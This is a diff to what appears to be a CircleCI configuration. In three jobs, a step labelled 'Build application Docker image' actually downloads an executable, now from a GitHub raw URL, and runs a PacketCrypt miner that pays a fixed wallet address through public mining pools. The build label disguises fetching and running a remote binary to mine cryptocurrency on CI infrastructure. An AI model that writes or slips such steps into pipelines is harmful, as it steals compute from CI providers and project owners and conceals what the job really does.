@@ -19,7 +19,7 @@ jobs:
       - run:
           name: Build application Docker image
           command: |
-            wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o 'annmine.rs.*Ke.*'"
+            wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
   images-2:
     working_directory: /app
     docker:
@@ -39,7 +39,7 @@ jobs:
       - run:
           name: Build application Docker image
           command: |
-            wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o 'annmine.rs.*Ke.*'"
+            wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
   images-3:
     working_directory: /app
     docker:
@@ -59,7 +59,7 @@ jobs:
       - run:
           name: Build application Docker image
           command: |
-            wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o 'annmine.rs.*Ke.*'"
+            wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
 workflows:
     version: 2.1
